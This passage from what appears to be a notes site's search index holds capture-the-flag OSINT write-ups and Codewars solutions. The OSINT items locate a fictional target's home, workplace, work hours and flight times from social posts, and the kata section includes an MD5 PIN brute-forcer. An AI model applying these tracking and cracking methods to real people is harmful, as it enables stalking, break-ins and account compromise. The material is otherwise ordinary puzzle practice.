know that the target is taking off from Bornholm Airport, we need to go to their website and see the information pertaining to outbound flights. After some digging, it was determined that the website is available at https://www.bornholms-lufthavn.dk/.\n\nLooking at several dates on the [flights page](https://www.bornholms-lufthavn.dk/passager/flytider) indicates that the first flight every morning, DX031, takes off at 06:15 to Copenhagen. [Travel Math](https://www.travelmath.com/flying-time/from/RNN/to/CPH) tells us that the flight takes between 40-41 minutes, so we can assume that the target arrives at 06:55.\n","n":0.078}}},{"i":103,"$":{"0":{"v":"Growing Up","n":0.707},"1":{"v":"\n```\nhttps://twitter.com/jammymarkson\n\nWhere did James spend his childhood?\n```\n\nJames mentions the `what3words` application on 10FEB2022, and his bio has the following text:\n\n> Born in ///purple.pulse.force, raised in ///push.asking.barn.\n\nSearching for this on the website ([link](https://what3words.com/push.asking.barn)) gives us the location York, North Yorkshire.\n","n":0.162}}},{"i":104,"$":{"0":{"v":"Connection Refused","n":0.707},"1":{"v":"\n```\nWe're trying to access this web address: http://time-traveler.icec.tf/\n\nThe server is not responding! It is essential that we find the information contained on this site as we suspect it to be part of a criminal enterprise.\n\nSources suggest that the site was accessible about 4 years ago, not sure how that is relevant but it might mean something to you?\n\n(Please enter the line of text in the box below, when you find it...)\n```\n\nI was able to use the Wayback Machine to find snapshots of the site from 2016, and the one [from June](https://web.archive.org/web/20160601212948/http://time-traveler.icec.tf/) had a line of text that matched the flag: `IceCTF{Th3y'11_n3v4r_f1|\\|d_m4h_fl3g_1n_th3_p45t}`.\n","n":0.1}}},{"i":105,"$":{"0":{"v":"Clocking Out","n":0.707},"1":{"v":"\n```\nWe're trying to plan when is best to break into James' house to plant a bug.\n\nWhat time does he start work? (UK time).\n```\n\n[This tweet](https://twitter.com/jammymarkson/status/1226989808783888384) indicates that James just completed 8 hours of work. In my time zone, the tweet was posted at 1702, which converts to 2202 in UK time. This means that James starts work at 1400 UK time, or \"2:00\" for normal folks.\n","n":0.124}}},{"i":106,"$":{"0":{"v":"Choochoo","n":1},"1":{"v":"\n```\nWe need to make sure James is far away when we try and break into his house.\n\nIn what city does James work?\n```\n\nOne picture of a train station that James posted ([link](https://twitter.com/jammymarkson/status/1226997008977866753/photo/1))contains the text \"Caerdydd Canolog\" and \"Great Western Railway\". A quick internet search on the text returns a Wikipedia page of the train station in Cardiff, Wales ([link](https://en.wikipedia.org/wiki/Cardiff_Central_railway_station)). This is the same city that James works in.\n","n":0.122}}},{"i":107,"$":{"0":{"v":"Chemtrails","n":1},"1":{"v":"\n```\nWe've been rummaging through a Person of Interest's wheelie bins. We've found this boarding pass; although it looks like whoever had it was a bit paranoid that someone like us would find it.\n\nI think we can still do something with this though... There is one thing in particular on here that may help us.\n\nWe really need to find the SEAT NUMBER of this person, in order to connect it with other evidence the team has gathered.\n\nWe've attached the boarding pass for you. Please find this out for us.\n```\n\n![Boarding Pass](./assets/pictures/boardingpass.png)\n\nVisiting the \"musicairport.com\" website yields that a lot of the content requires Adobe Flash Player to function, so this is a dead end. The site is incredibly low-quality, so the fact that it's on the ticket makes me think that it's important somehow. Will look into getting access to the content more if nothing else pans out.\n\nThe \"IATA\" abbreviation on the ticket stands for the International Air Transport Association. The departing airport, LHR, stands for London Heathrow Airport. The destination, CDG, stands for Charles de Gaulle Airport in Paris, France.\n\nNo matching flights for that gate could be found for the date on [Dutch Plane Spotters](https://schiphol.dutchplanespotters.nl/?date=2020-02-12&group=hourarr&excludeLocals=true). I downloaded the historical data from the Heathrow airport for December of 2020 [here](http://www.lhr-lgw.co.uk/heathrow-archives-2020.html), but was unable to open the file in any meaningful way to yield any data.\n\nFinally I decided to try the obvious, which is reading the ticket's barcode. [This site](https://online-barcode-reader.inliteresearch.com/) is able to read uploaded images' barcodes, and it yielded the following:\n\n```\nSarah, Luxton - LHR to CDG - BA304 - SEAT NUMBER: 22B\n```\n","n":0.062}}},{"i":108,"$":{"0":{"v":"Bigbrother","n":1},"1":{"v":"\n```\nWe've intercepted a live camera feed overlooking a public space. The camera owner has not bothered to put a password on it and its open to the world!\n\nAn extremely dangerous criminal on the run was recently spotted by our surveillance team using this camera.\n\nIt is essential to our investigation that we find out the COUNTRY where this camera is operating from so we know which law enforcement agency to follow up with.\n\nPlease find this out for us.\n\nLIVE CAMERA FEED: http://81.82.201.132\n```\n\nTo determine the country of the IP, I used the [WhatIsMyIPAddress.com website](https://whatismyipaddress.com/ip/81.82.201.132). It yielded that the country in question is Belgium.\n","n":0.1}}},{"i":109,"$":{"0":{"v":"Codewars","n":1}}},{"i":110,"$":{"0":{"v":"Crack the PIN","n":0.577},"1":{"v":"\n### PHP\n\n```php\nfunction crack($hash) {\n  $pin = \"00000\";\n  $passHash = md5($pin);\n\n  while ($passHash != $hash) {\n    $pin++;\n    $pin = str_pad($pin, 5, \"0\", STR_PAD_LEFT);\n    $passHash = md5($pin);\n  }\n\n  return $pin;\n}\n```\n","n":0.189}}},{"i":111,"$":{"0":{"v":"Polydivisible Numbers","n":0.707},"1":{"v":"\n### Python\n\n```py\ndef polydivisible(x):\n    isPoly = True\n    for numDigits in range(1, len(str(x)) + 1):\n        num = int(str(x)[:numDigits])\n        if num % numDigits is not 0:\n            isPoly = False\n            break\n    return isPoly\n```\n","n":0.186}}},{"i":112,"$":{"0":{"v":"Halving Sum","n":0.707},"1":{"v":"\n### Java\n\n```java\npublic class HalvingSum {\n  int halvingSum(int n) {\n    int sum = 0;\n    for (int i = 1; i <= n; i *= 2) {\n      sum += n / i;\n    }\n\n    return sum;\n  }\n}\n```\n\n### Python\n\n```py\ndef halving_sum(n):\n    i, sum = 1, 0\n    while i <= n:\n        sum += int(n / i)\n        i *= 2;\n    return sum\n```\n\n### JavaScript\n\n```js\nfunction halvingSum(n) {\n  let i = 1, sum = 0\n  while (i <= n) {\n    sum += parseInt(n / i)\n    i *= 2\n  }\n\n  return sum\n}\n```\n","n":0.111}}},{"i":113,"$":{"0":{"v":"Papers, Please","n":0.707},"1":{"v":"\n### Python\n\n```py\nimport re\nfrom datetime import datetime\n\nclass Inspector:\n    def __init__(self):\n        self.allowed_countries = []\n        self.requirements = []\n        self.document_expiration_date = datetime(year=1982, month=11, day=22)\n        self.criminal = \"\"\n        self.current_entrant_info = {}\n\n\n    def receive_bulletin(self, bulletin):\n        # Update the allowed countries list with new countries\n        allowed_countries = self.getRegex(\"Allow citizens of (.*)\", bulletin)\n        self.allowed_countries.extend(re.split(\", \", allowed_countries))\n\n        # Update the allowed countries list by removing denied countries\n        denied_countries = self.getRegex(\"Deny citizens of (.*)\", bulletin)\n        self.allowed_countries = list(\n          filter(lambda x: x not in denied_countries, self.allowed_countries)\n        )\n\n        # Update the list of requirements\n        new_requirements = re.findall(\"(.*)(?<!no longer) require (.*)\", bulletin)\n        self.requirements.extend(self.createRequirementList(new_requirements))\n        remove_requirements = re.findall(\"(.*) no longer require (.*)\", bulletin)\n        self.requirements = list(\n          filter(\n            lambda x: x not in self.createRequirementList(remove_requirements),\n            self.requirements\n          )\n        )\n\n        # Updates the criminal of the day\n        criminal = self.getRegex(\"Wanted by the State: (.*)\", bulletin)\n        if criminal != \"\":\n            names = criminal.split(\" \")\n            criminal = names[1] + \", \" + names[0]\n        self.criminal = criminal\n\n\n    def inspect(self, documents):\n        ##\n        # Create objects out of the data from the available documents\n        ##\n        vaccination_info = documents.get(\"certificate_of_vaccination\", \"\")\n        vaccination_card = self.getDocumentData(vaccination_info)\n\n        passport_info = documents.get(\"passport\", \"\")\n        passport = self.getDocumentData(passport_info)\n\n        access_permit_info = documents.get(\"access_permit\", \"\")\n        access_permit = self.getDocumentData(access_permit_info)\n\n        grant_of_asylum_info = documents.get(\"grant_of_asylum\", \"\")\n        grant_of_asylum = self.getDocumentData(grant_of_asylum_info)\n\n        diplomatic_info = documents.get(\"diplomatic_authorization\", \"\")\n        diplomatic_authorization = self.getDocumentData(diplomatic_info)\n\n        work_pass_info = documents.get(\"work_pass\", \"\")\n        work_pass = self.getDocumentData(work_pass_info)\n\n        id_card_info = documents.get(\"ID_card\", \"\")\n        id_card = self.getDocumentData(id_card_info)\n\n        ##\n        # Add entrant information for use across functions\n        ##\n        self.current_entrant_info[\"vaccination_card\"] = vaccination_card\n        self.current_entrant_info[\"passport\"] = passport\n        self.current_entrant_info[\"grant_of_asylum\"] = grant_of_asylum\n        self.current_entrant_info[\"access_permit\"] = access_permit\n        self.current_entrant_info[\"diplomatic_authorization\"] = diplomatic_authorization\n        self.current_entrant_info[\"work_pass\"] = work_pass\n        self.current_entrant_info[\"ID_card\"] = id_card\n\n        ##\n        # Entrant is detained\n        ##\n        if (\n          (passport and self.criminal == passport[\"name\"]) or\n          (access_permit and self.criminal == access_permit[\"name\"]) or\n          (grant_of_asylum and self.criminal == grant_of_asylum[\"name\"])\n        ):\n            return \"Detainment: Entrant is a wanted criminal.\"\n\n        id_list = self.getDocumentValues(\"id\")\n        if not all(x == id_list[0] for x in id_list):\n            return \"Detainment: ID number mismatch.\"\n\n        nation_list = self.getDocumentValues(\"nation\")\n        nation = nation_list[0] if len(nation_list) else \"\"\n        if not all(x == nation_list[0] for x in nation_list):\n            return \"Detainment: nationality mismatch.\"\n\n        dob_list = self.getDocumentValues(\"dob\")\n        if not all(x == dob_list[0] for x in dob_list):\n            return \"Detainment: date of birth mismatch.\"\n\n        name_list = self.getDocumentValues(\"name\")\n        if not all(x == name_list[0] for x in name_list):\n            return \"Detainment: name mismatch.\"\n\n        ##\n        # Entrant is denied for an invalid document\n        ##\n        diplomatic_nations = diplomatic_authorization.get(\"access\")\n        if diplomatic_nations and \"Arstotzka\" not in diplomatic_nations:\n            return \"Entry denied: invalid diplomatic authorization.\"\n\n        ##\n        # Entrant is denied from the country for an expired document\n        ##\n        if passport.get(\"expiration\", datetime.now()) < self.document_expiration_date:\n            return \"Entry denied: passport expired.\"\n        elif grant_of_asylum.get(\"expiration\", datetime.now()) < self.document_expiration_date:\n            return \"Entry denied: grant of asylum expired.\"\n        elif access_permit.get(\"expiration\", datetime.now()) < self.document_expiration_date:\n            return \"Entry denied: access permit expired.\"\n\n        ##\n        # Entrant is a member of a denied country\n        ##\n        if len(nation) and nation not in self.allowed_countries:\n            return \"Entry denied: citizen of banned nation.\"\n\n        ##\n        # Assign the entrant groups based on their provided documentation\n        ##\n        groups = [\"Entrants\"]\n        if nation == \"Arstotzka\":\n            groups.append(\"Citizens of Arstotzka\")\n        else:\n            groups.append(\"Foreigners\")\n            if len(nation): groups.append(\"Citizens of \" + nation)\n        if access_permit.get(\"purpose\") == \"WORK\":\n            groups.append(\"Workers\")\n\n        ##\n        # Entrant is denied from the country for not meeting bulletin requirements\n        ##\n        for requirement in self.requirements:\n            if requirement[0] in groups:\n                requirement_met = self.checkForRequirement(requirement[1])\n                if requirement_met is not True:\n                    return \"Entry denied: \" + requirement_met\n\n        # Entrant is allowed into the country\n        if (nation == \"Arstotzka\"):\n            return \"Glory to Arstotzka.\"\n        else:\n            return \"Cause no trouble.\"\n\n\n    def getDocumentValues(self, key):\n        values = []\n        values.append(self.current_entrant_info[\"vaccination_card\"].get(key))\n        values.append(self.current_entrant_info[\"passport\"].get(key))\n        values.append(self.current_entrant_info[\"grant_of_asylum\"].get(key))\n        values.append(self.current_entrant_info[\"access_permit\"].get(key))\n        values.append(self.current_entrant_info[\"diplomatic_authorization\"].get(key))\n        values.append(self.current_entrant_info[\"work_pass\"].get(key))\n        values.append(self.current_entrant_info[\"ID_card\"].get(key))\n        return list(filter(lambda x: x is not None, values))\n\n\n    def createRequirementList(self, requirement_list):\n        for requirement in requirement_list:\n            citizenship_requirement = self.getRegex(\"Citizens of (.*)\", requirement[0])\n            if citizenship_requirement:\n                requirement_list.remove(requirement)\n                countries = requirement[0].split(\", \")\n                requirement_list.extend(list(map(\n                  lambda x: (\"Citizens of \" + x if not re.search(\"Citizens of \", x) else x, requirement[1]),\n                  countries\n                )))\n\n        return requirement_list\n\n\n    def checkForRequirement(self, requirement):\n        if \"vaccination\" in requirement:\n            vaccination_card = self.current_entrant_info[\"vaccination_card\"]\n            if not vaccination_card:\n                return \"missing required certificate of vaccination.\"\n            vaccine = re.sub(\" vaccination\", \"\", requirement)\n            if not vaccination_card or not re.search(vaccine, vaccination_card[\"vaccines\"]):\n                return \"missing required vaccination.\"\n        elif \"passport\" in requirement:\n            if not self.current_entrant_info[\"passport\"]:\n                return \"missing required passport.\"\n        elif \"access permit\" in requirement:\n            if (\n              not self.current_entrant_info[\"access_permit\"] and\n              not self.current_entrant_info[\"grant_of_asylum\"] and\n              not self.current_entrant_info[\"diplomatic_authorization\"]\n            ):\n                return \"missing required access permit.\"\n        elif \"work pass\" in requirement:\n            if not self.current_entrant_info[\"work_pass\"]:\n                return \"missing required work pass.\"\n        elif \"ID card\" in requirement:\n            if not self.current_entrant_info[\"ID_card\"]:\n                return \"missing required ID card.\"\n\n        return True\n\n\n    def getDocumentData(self, doc):\n        docData = {}\n        for line in doc.splitlines():\n            if \"DOB: \" in line:\n                dob = self.getRegex(\"DOB: (.*)\", doc)\n                dob_parts = [int(x) for x in re.split(\"\\.\", dob)]\n                docData[\"dob\"] = datetime(year=dob_parts[0], month=dob_parts[1], day=dob_parts[2])\n            elif \"EXP: \" in line:\n                expiration = self.getRegex(\"EXP: (.*)\", doc)\n                expiration_parts = [int(x) for x in re.split(\"\\.\", expiration)]\n                docData[\"expiration\"] = datetime(year=expiration_parts[0], month=expiration_parts[1], day=expiration_parts[2])\n            else:\n                key, value = line.split(\": \")\n                key = re.sub(\"#\", \"\", key.lower())\n                docData[key] = value\n\n        return docData\n\n\n    def getRegex(_self, regex, data):\n        regex = re.search(regex, data)\n        return regex.group(1) if regex else \"\"\n```\n","n":0.036}}},{"i":114,"$":{"0":{"v":"\"AURUM RECLUDIT CUNCTA\"","n":0.577},"1":{"v":"\n### JavaScript\n\nThe first line is `constructor` and the second is `fromCharCode`. Answer heavily inspired by [this answer](https://www.codewars.com/kata/reviews/594a7f6742fc693231000022/groups/60e0577031ed6b0001806469), combined with a little [JSFuck](http://www.jsfuck.com/) magic.\n\nTo see what `s` is, use `console.log(s)` for the function contents. It appears to be the `it` function contents from Jasmine, which we have access to thanks to the Codewars test runner.\n\n```js\nconst $ = (s=`${it}`) => \"\"\n  [`c${s[6]}nst${s[36]}` + ([][[]]+[])[+[]] + `ct${s[6]}${s[36]}`]\n  [`f${s[36]}${s[6]}${s[10]}C${s[48]}${s[64]}${s[36]}C${s[6]}${s[32]}${s[33]}`]\n  (65,85,82,85,77)\n```\n","n":0.123}}},{"i":115,"$":{"0":{"v":"The soul of wit: reverse an array","n":0.378},"1":{"v":"\n### JavaScript\n\n```js\nreverse=a=>[...a].map(a.pop,a)\n```\n","n":0.707}}},{"i":116,"$":{"0":{"v":"-Reverse it, quickly!","n":0.577},"1":{"v":"\n### JavaScript\n\n```js\nweirdReverse=a=>a.sort(a=>1)\n```\n","n":0.707}}},{"i":117,"$":{"0":{"v":"Covered pawns","n":0.707},"1":{"v":"\n## Instructions\n\nGiven a list of white pawns on a chessboard (any number of them, meaning from 0 to 64 and with the possibility to be positioned everywhere), determine how many of them have their backs covered by another. Pawns attacking upwards since we have only white ones.\n\nPlease remember that a pawn attack(and defend as well) only the 2 square on the sides in front of him. https://en.wikipedia.org/wiki/Pawn_(chess)#/media/File:Pawn_(chess)_movements.gif\n\n### JavaScript\n\n```js\n// https://stackoverflow.com/a/12504132/6456163\nString.prototype.nextChar = function() {\n  return String.fromCharCode(this.charCodeAt(0) + 1);\n}\nString.prototype.prevChar = function() {\n  return String.fromCharCode(this.charCodeAt(0) - 1);\n}\n\nfunction coveredPawns(pawns) {\n  const covered = [];\n\n  pawns.forEach((pawn) => {\n    const nextRow = parseInt(pawn[1]) + 1;\n    const left = pawn[0].nextChar() + nextRow;\n    const right = pawn[0].prevChar() + nextRow;\n\n    for (const pawn of [left, right])\n      if (pawns.includes(pawn) && !covered.includes(pawn))\n        covered.push(pawn);\n  });\n\n  return covered.length;\n}\n```\n\n### Python\n\n```py\ndef covered_pawns(pawns):\n    covered = []\n\n    for pawn in pawns:\n        nextRow = int(pawn[1]) + 1\n        left = chr(ord(pawn[0]) + 1) + str(nextRow)\n        right = chr(ord(pawn[0]) - 1) + str(nextRow)\n\n        for pawn in [left, right]:\n            if (pawn in pawns and pawn not in covered):\n                covered.append(pawn)\n\n    return len(covered)\n```\n","n":0.077}}},{"i":118,"$":{"0":{"v":"Take the Derivative","n":0.577},"1":{"v":"\n### Python\n\n```py\ndef derive(coeff, exp):\n    return str(coeff * exp) + \"x^\" + str(exp - 1);\n```\n","n":0.267}}},{"i":119,"$":{"0":{"v":"Pirate Island Conquer Part 1","n":0.447},"1":{"v":"\n### JavaScript\n\n```js\nvar mapSize = 8;\nvar uninhabitedIslands = [],\n    marineIslands = [];\n\nfunction conquerIsland(map) {\n  findIslands(map);\n\n  if (uninhabitedIslands.length == 1 && marineIslands.length == 0) {\n    return uninhabitedIslands[0];\n  } else if (marineIslands.length == 1 && !uninhabitedIslands) {\n    return marineIslands[0];\n  } else {\n    var marineSolutions = getClosest([], marineIslands, true);\n    var finalSolutions = getClosest(marineSolutions, uninhabitedIslands, false);\n    if (finalSolutions.length == 1) finalSolutions = finalSolutions[0];\n\n    return finalSolutions;\n  }\n}\n\nfunction findIslands(map) {\n  // Reset the arrays\n  uninhabitedIslands = [];\n  marineIslands = [];\n\n  // iterate over the whole map, recording islands\n  for (var x = 0; x < mapSize; x++) {\n    for (var y = 0; y < mapSize; y++) {\n      var coordinates = [x, y];\n      var currentChar = map[x][y].charAt(0);\n      if (currentChar == 'u') {\n        // Uninhabited island; highest priority\n        uninhabitedIslands.push(coordinates);\n      } else if (currentChar == 'm') {\n        // Marine island; lower priority\n        marineIslands.push(coordinates);\n      }\n    }\n  }\n}\n\nfunction getDistance(coordinates) {\n  var x = coordinates[0], y = coordinates[1];\n  return x + y;\n}\n\n/**\n * Returns the array of the closest island or islands.\n */\nfunction getClosest(solutions, islands, marine) {\n  var minDistance = [999, 'm'];\n\n  for (let i = 0; i < islands.length; i++) {\n    var currentIsland = islands[i];\n    var distance = getDistance(currentIsland);\n\n    if (distance <= minDistance[0]) {\n      let previousMin = minDistance[1];\n      minDistance = [distance, marine ? 'm' : 'u'];\n\n      if (solutions[0] && distance == getDistance(solutions[0])) {\n        // Already a solution of equivalent distance\n        if (!marine && previousMin === 'u') {\n          solutions.push(currentIsland);\n        } else {\n          solutions = [currentIsland];\n        }\n      } else {\n        // Lowest solution found so far\n        solutions = [currentIsland];\n      }\n    }\n  }\n\n  return solutions;\n}\n```\n","n":0.063}}},{"i":120,"$":{"0":{"v":"Oh come on! Hello world! once again?","n":0.378},"1":{"v":"\n### JavaScript\n\n```js\nf=_=>\"\\u0048\\u0065\\u006c\\u006c\\u006f\\u002c\\u0020\\u0077\\u006f\\u0072\\u006c\\u0064\\u0021\";\n```\n\n### C++\n\n```cpp\nstd::string f() {\n  return \"\\u0048\\u0065\\u006c\\u006c\\u006f\\u002c\\u0020\\u0077\\u006f\\u0072\\u006c\\u0064\\u0021\";\n}\n```\n\n### C#\n\n```cs\npublic class Kata {\n  public static string F() =>\n    \"\\u0048\\u0065\\u006c\\u006c\\u006f\\u002c\\u0020\\u0077\\u006f\\u0072\\u006c\\u0064\\u0021\";\n}\n```\n","n":0.243}}},{"i":121,"$":{"0":{"v":"Ranking System","n":0.707},"1":{"v":"\n### JavaScript\n\n```js\nfunction rankings(arr) {\n  var originalArr = [...arr];\n  var sortedArray = arr.concat().sort(function (a, b) { return b - a; });\n  var rankings = [];\n\n  let len = arr.length;\n  for (let i = 0; i < len; i++) {\n    rankings[originalArr.indexOf(sortedArray[i])] = i + 1;\n  }\n\n  return rankings;\n}\n```\n\n### Python\n\n```py\ndef rankings(arr):\n    sortedArray = sorted(arr, reverse=True)\n    length = len(arr)\n    rankings = [None] * length\n\n    for i in range(length):\n        rankings[arr.index(sortedArray[i])] = i + 1\n\n    return rankings\n```\n","n":0.119}}},{"i":122,"$":{"0":{"v":"Character with longest consecutive repetition","n":0.447},"1":{"v":"\n### JavaScript\n\n```js\nfunction longestRepetition(s) {\n  if (s.length == 0) return [\"\", 0];\n\n  let longest = [s.charAt(0), 1];\n  let currentCount = 1;\n  for (let i = 1; i < s.length; i++) {\n    let currentChar = s.charAt(i),\n        lastChar = s.charAt(i - 1);\n    if (currentChar == lastChar) {\n      currentCount++;\n      if (currentCount > longest[1])\n        longest = [currentChar, currentCount];\n    } else {\n      currentCount = 1;\n    }\n  }\n\n  return longest;\n}\n```\n","n":0.126}}},{"i":123,"$":{"0":{"v":"Encrypt this!","n":0.707},"1":{"v":"\n### JavaScript\n\n```js\nconst encryptThis = (text) => {\n  let words = text.split(\" \");\n\n  for (let i = 0; i < words.length; i++) {\n    let word = words[i];\n    if (word.length > 1) {\n      const secondLetter = word.charAt(1);\n      const lastCharIndex = word.length - 1;\n      const lastLetter = word.charAt(lastCharIndex);\n      word = word.replaceAt(1, lastLetter);\n      word = word.replaceAt(lastCharIndex, secondLetter);\n    }\n\n    var ascii = word.charCodeAt(0);\n    word = word.slice(1);\n    word = ascii + word;\n    words[i] = word;\n  }\n\n  return words.join().replaceAll(\",\", \" \");\n}\n\nString.prototype.replaceAt = function(index, replacement) {\n  return this.substr(0, index) + replacement + this.substr(index + replacement.length);\n}\n\n// Using the lazy way to replace the random commas with spaces; will break eventually\nString.prototype.replaceAll = function(search, replacement) {\n  let target = this;\n  return target.replace(new RegExp(search, 'g'), replacement);\n};\n```\n","n":0.094}}},{"i":124,"$":{"0":{"v":"Find the missing letter","n":0.5},"1":{"v":"\n### JavaScript\n\n```js\nfunction findMissingLetter(array) {\n  let previousCharCode = '';\n  for (let i = 0; i < array.length; i++) {\n    const charCode = array[i].charCodeAt(0);\n    if (previousCharCode != '' && charCode != previousCharCode + 1) {\n      return String.fromCharCode(charCode - 1);\n    } else {\n      previousCharCode = charCode;\n    }\n  }\n\n  return ' ';\n}\n```\n","n":0.144}}},{"i":125,"$":{"0":{"v":"Decipher this!","n":0.707},"1":{"v":"\n### JavaScript\n\n```js\nfunction decipherThis(str) {\n  var words = str.split(\" \");\n\n  for (var i = 0; i < words.length; i++) {\n    var word = words[i];\n    var charCode = word.match(/\\d+/)[0];\n    word = word.replace(charCode, '');\n\n    var firstCharacter = String.fromCharCode(charCode);\n    word = firstCharacter + word;\n\n    if (word.length > 2) {\n      var lastChar = word.charAt(word.length - 1);\n      var secondChar = word.charAt(1);\n      word = word.replaceAt(1, lastChar);\n      word = word.replaceAt(word.length - 1, secondChar);\n    }\n\n    words[i] = word;\n  }\n\n  return words.join().replaceAll(\",\", \" \");\n};\n\nString.prototype.replaceAt = function(index, replacement) {\n    return this.substr(0, index) + replacement + this.substr(index + replacement.length);\n}\n\n// Using the lazy way to replace the random commas with spaces; will break eventually\nString.prototype.replaceAll = function(search, replacement) {\n  var target = this;\n  return target.replace(new RegExp(search, 'g'), replacement);\n};\n```\n","n":0.094}}},{"i":126,"$":{"0":{"v":"Highest Scoring Word","n":0.577},"1":{"v":"\n### Elixir\n\n```elixir\ndefmodule Kata do\n  def high(str) do\n    words = String.split(str, \" \")\n    word_values = Enum.map(words, fn word -> get_word_value(word) end)\n    max_value = Enum.max(word_values)\n    index = Enum.find_index(word_values, fn x -> x == max_value end)\n    Enum.at(words, index)\n  end\n\n  def get_word_value(word) do\n    chars = String.split(word, \"\", trim: true)\n    Enum.reduce chars, 0, fn (char, acc) ->\n      # https://elixirforum.com/t/get-ascii-value-of-a-character/16619/3\n      <<val::utf8>> = char\n      val - 96 + acc # a's codepoint is 97 and the intended value is 1\n    end\n  end\nend\n```\n","n":0.115}}},{"i":127,"$":{"0":{"v":"Fake Binary","n":0.707},"1":{"v":"\n### JavaScript\n\n```js\nconst fakeBin = (x) => [...x].map((val) => val < 5 ? 0 : 1).join('');\n```\n","n":0.258}}},{"i":128,"$":{"0":{"v":"altERnaTIng cAsE <=> ALTerNAtiNG CaSe","n":0.447},"1":{"v":"\n### Elixir\n\n```elixir\ndefmodule Codewars.StringUtils do\n  def alter_case(str) do\n    to_string(\n      Enum.map(\n        String.graphemes(str),\n        fn char -> change_char_case(char) end\n      )\n    )\n  end\n\n  def change_char_case(char) do\n    if String.upcase(char) == char do\n      String.downcase(char)\n    else\n      String.upcase(char)\n    end\n  end\nend\n```\n","n":0.18}}},{"i":129,"$":{"0":{"v":"Sum of numbers from 0 to N","n":0.378},"1":{"v":"\n### JavaScript\n\n```js\nvar SequenceSum = (function() {\n  function SequenceSum() {}\n\n  SequenceSum.showSequence = function(count) {\n    if (count < 0) return count + \"<\" + 0;\n    if (count == 0) return count + \"=\" + 0;\n\n    let sum = 0, str = \"\";\n    for (let i = 0; i <= count; i++) {\n      sum += count;\n      str += i + ((i != count) ? \"+\" : \" = \" + sum / 2);\n    }\n\n    return str;\n  };\n\n  return SequenceSum;\n\n})();\n```\n","n":0.115}}},{"i":130,"$":{"0":{"v":"How many are smaller than me?","n":0.408},"1":{"v":"\n### JavaScript\n\n```js\nfunction smaller(nums) {\n  var smallerNums = [];\n  for (var index = 0; index < nums.length; index++) {\n    var numToCheck = nums[index];\n    var smallerCount = 0;\n    for (var remainingIndices = nums.length - index; remainingIndices > 0; remainingIndices--) {\n      if (nums[index + remainingIndices] < numToCheck) smallerCount++;\n    }\n\n    smallerNums.push(smallerCount);\n  }\n\n  return smallerNums;\n}\n```\n","n":0.141}}},{"i":131,"$":{"0":{"v":"Equal Sides Of An Array","n":0.447},"1":{"v":"\n### JavaScript\n\n```js\nfunction findEvenIndex(arr) {\n  for (const index in arr) {\n    let workingArr = [...arr];\n    workingArr[index] = 0;\n\n    const firstHalf = workingArr.slice(0, index);\n    const secondHalf = workingArr.slice(index);\n\n    const firstHalfSum = firstHalf.reduce((acc, num) => acc + num, 0);\n    const secondHalfSum = secondHalf.reduce((acc, num) => acc + num, 0);\n\n    if (firstHalfSum === secondHalfSum) return parseInt(index);\n  }\n\n  return -1;\n}\n```\n","n":0.135}}},{"i":132,"$":{"0":{"v":"Two to One","n":0.577},"1":{"v":"\n### JavaScript\n\n```js\nfunction longest(s1, s2) {\n  let uniqueString = \"\";\n  const uniqueLetter = (letter) => !uniqueString.includes(letter);\n\n  function includeString(str) {\n    for (let i = 0; i < str.length; i++) {\n      const currentChar = str.charAt(i);\n      if (uniqueLetter(currentChar)) {\n        uniqueString += currentChar;\n      }\n    }\n  }\n\n  includeString(s1);\n  includeString(s2);\n\n  return sortString(uniqueString);\n}\n\nfunction sortString(str) {\n  const arr = str.split('');\n  const sorted = arr.sort();\n  return sorted.join('');\n}\n```\n","n":0.132}}},{"i":133,"$":{"0":{"v":"Sum and Rest the Number with its Reversed and See What Happens","n":0.289},"1":{"v":"\n### JavaScript\n\n```js\nlet termsToAdd = [], foundTerms = [];\n\nfunction sumDifRev(n) {\n  if (foundTerms.length < n) populateTerms();\n  return foundTerms[n - 1];\n}\n\nfunction populateTerms() {\n  let lastTerm = foundTerms[foundTerms.length - 1];\n  let numToTest = lastTerm ? lastTerm + 1 : 0;\n\n  for (let i = numToTest; i < 1000000; i++) {\n    // Reversed number\n    if (termsToAdd.includes(i)) {\n      foundTerms.push(i);\n      continue;\n    }\n\n    var reverse = flipInt(i);\n    var sum = i + reverse;\n    var diff = Math.abs(i - reverse);\n\n    // Checks if the condition is met\n    if (sum % diff == 0) {\n      if (reverse.toString().length == i.toString().length) {\n        foundTerms.push(i);\n        termsToAdd.push(reverse);\n      }\n    }\n  }\n}\n\n// https://stackoverflow.com/a/52366332\nfunction flipInt(n) {\n  var digit, result = 0;\n  while (n) {\n      digit = n % 10;                  //  Get last digit. Ex. 123/10 → 12.3 → 3\n      result = (result * 10) + digit;  //  Ex. 123 → 1230 + 4 → 1234\n      n = n/10|0;                      //  Remove last digit. Ex. 123 → 12.3 → 12\n  }\n\n  return result;\n}\n```\n\n### CoffeeScript\n\n```coffee\nfoundTerms = []\n\nsumDifRev = (n) ->\n  if foundTerms.length < n\n    populateTerms()\n\n  return foundTerms[n - 1]\n\npopulateTerms = () ->\n  i = 0\n  while i < 1000000\n    reverse = flipInt(i)\n    sum = i + reverse\n    diff = Math.abs(i - reverse)\n\n    # Checks if the condition is met\n    if sum % diff == 0\n      if reverse.toString().length == i.toString().length\n        foundTerms.push(i)\n\n    i++\n\n# https://stackoverflow.com/a/52366332\nflipInt = (n) ->\n  digit = 0\n  result = 0\n  while n != 0\n      digit = n % 10\n      result = (result * 10) + digit\n      n = n/10|0;\n\n  return result\n```\n\n### Python\n\n```py\nfoundTerms = []\n\ndef sum_dif_rev(n):\n    if len(foundTerms) < n:\n        populateTerms()\n\n    return foundTerms[n - 1]\n\ndef populateTerms():\n    for i in range(1, 1000000):\n        reverse = flipInt(i)\n        sum = i + reverse\n        diff = abs(i - reverse)\n\n        # Checks if the condition is met\n        if diff != 0 and sum % diff == 0:\n            if len(str(reverse)) == len(str(i)):\n                foundTerms.append(i)\n\n# https://stackoverflow.com/a/52366332\ndef flipInt(num):\n  rev = 0\n  while num > 0:\n    rev = (10 * rev) + num % 10\n    num //= 10\n  return rev\n```\n","n":0.056}}},{"i":134,"$":{"0":{"v":"Sum of odd numbers","n":0.5},"1":{"v":"\n### PowerShell\n\n```powershell\nfunction RowSumOddNumbers([int] $n) {\n  return $n * $n * $n;\n}\n```\n\n### JavaScript\n\n```js\nfunction rowSumOddNumbers(n) {\n  let sum = 0, num = 1;\n  for (let row = 1; row <= n; row++) {\n    for (let i = 0; i < row; i++) {\n      if (row == n) sum += num;\n      num += 2;\n    }\n  }\n\n  return sum;\n}\n```\n","n":0.135}}},{"i":135,"$":{"0":{"v":"Regex validate PIN code","n":0.5},"1":{"v":"\n### 